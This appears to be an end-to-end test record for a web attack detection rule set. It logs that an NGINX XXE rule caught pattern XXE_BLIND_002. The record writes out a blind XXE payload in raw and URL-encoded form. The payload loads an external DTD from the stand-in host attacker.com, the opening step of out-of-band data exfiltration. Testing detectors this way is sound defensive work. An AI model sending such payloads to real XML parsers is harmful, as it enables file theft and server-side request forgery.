name: test_e2e_with_logs[401_XXE_BLIND_002]
description:
## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XXE_BLIND_002` |
| **Name** | Blind XXE with Parameter Entity DTD |
| **Category** | XXE |
| **Subcategory** | blind_xxe |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]>`
- **Encoded**: `%3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20%25%20xxe%20SYSTEM%20%22http%3A%2F%2Fattacker.com%2Fevil.dtd%22%3E%25xxe%3B%5D%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~58000ms
- **Timestamp**: 13:44:15.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XXE Attack] DOCTYPE/ENTITY injection` |
| **Matched Rule** | `[NGINX XXE Attack] DOCTYPE/ENTITY injection test_id=XXE_BLIND_002-1771076655838-xcxtlc pattern_id=XXE_BLIND_002 uri=/?q=%3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20%25%20xxe%20SYSTEM%20%22http%3A%2F%2Fattacker.com%2Fevil.dtd%22%3E%25xxe%3B%5D%3E client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence
